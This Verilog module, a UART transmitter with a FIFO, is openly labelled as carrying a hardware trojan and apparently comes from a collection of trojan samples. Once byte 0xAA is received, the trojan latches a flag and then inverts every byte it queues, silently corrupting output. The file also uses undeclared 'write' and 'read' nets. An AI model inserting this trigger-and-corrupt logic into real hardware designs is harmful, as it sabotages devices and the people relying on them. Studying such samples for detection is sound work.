 // Modified UART TX Module with FIFO and a Data-Altering Hardware Trojan
module uart_tx_fifo_trojan_v5 (
    input clk,
    input rx_we,
    input [7:0] rx_data,
    output reg tx_busy = 1'b0,
    output tx_serial
);

    reg [7:0] mem [0:31]; // FIFO memory
    reg [4:0] w_addr = 5'd0, r_addr = 5'd0; // Write and read pointers
    reg [4:0] cnt = 5'd0; // Count of bytes in FIFO
    reg we = 1'b0; // Write enable for internal UART TX
    reg [7:0] data = 8'd0; // Data to be sent

    wire uart_busy;
    uart_tx uart (
        .clk(clk),
        .rx_we(we),
        .rx_data(data),
        .tx_busy(uart_busy),
        .tx_serial(tx_serial)
    );

    // Trojan activity flags and detection mechanism
    reg trojan_detected = 1'b0; // Flag indicating if the Trojan has been triggered

    // Data alteration condition - the Trojan gets activated when a specific byte sequence is detected
    always @(posedge clk) begin
        if (rx_we && rx_data == 8'hAA) begin // Specific trigger condition
            trojan_detected <= 1'b1; // Set the trojan as detected
        end
    end

    // Behavior with Trojan: alters outgoing data under certain conditions
    always @(posedge clk) begin
        if (write) begin
            w_addr <= w_addr + 5'd1;
            // If Trojan is detected, alter the data subtly
            mem[w_addr] <= trojan_detected ? (rx_data ^ 8'hFF) : rx_data;
            cnt <= cnt + 5'd1;
        end

        if (~uart_busy && (cnt > 5'd0) && ~we) begin
            data <= mem[r_addr];
            r_addr <= r_addr + 5'd1;
            cnt <= cnt - 5'd1;
            we <= 1'b1;
        end else begin
            we <= 1'b0;
        end
    end

    assign write = rx_we && (cnt < 5'd31);
    assign read = ~uart_busy && (cnt > 5'd0) && ~we;

    // Managing the busy flag
    always @(posedge clk) begin
        tx_busy <= uart_busy || (cnt != 5'd0);
    end

endmodule
